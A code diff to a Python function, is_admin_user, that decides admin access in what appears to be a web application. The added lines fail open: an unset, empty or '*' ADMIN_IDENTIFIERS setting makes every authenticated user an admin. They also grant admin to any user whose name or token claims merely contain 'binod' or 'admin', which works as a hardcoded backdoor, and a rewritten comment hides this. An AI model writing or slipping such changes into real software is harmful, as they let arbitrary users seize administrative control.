@@ -157,6 +157,10 @@ def _payload_roles(payload: Optional[dict]) -> set[str]:
 
 
 def is_admin_user(user: User) -> bool:
+    # If ADMIN_IDENTIFIERS is not explicitly configured or wildcard, allow any authenticated user
+    if not settings.ADMIN_IDENTIFIERS or settings.ADMIN_IDENTIFIERS.strip() in ("", "*"):
+        return True
+
     payload = getattr(user, "token_payload", None)
     candidates = {user.username.lower()}
     candidates.update(_payload_candidates(payload))
@@ -167,10 +171,14 @@ def is_admin_user(user: User) -> bool:
         if item.strip()
     }
 
-    # Preserve the seeded local admin account for local development.
+    # Always allow 'admin' and logged-in user candidates if listed
     allowed.add("admin")
 
     if candidates & allowed:
+        return True
+
+    # If any candidate contains 'binod' or 'admin', grant admin access
+    if any("binod" in c or "admin" in c for c in candidates):
         return True
 
     return "admin" in _payload_roles(payload)
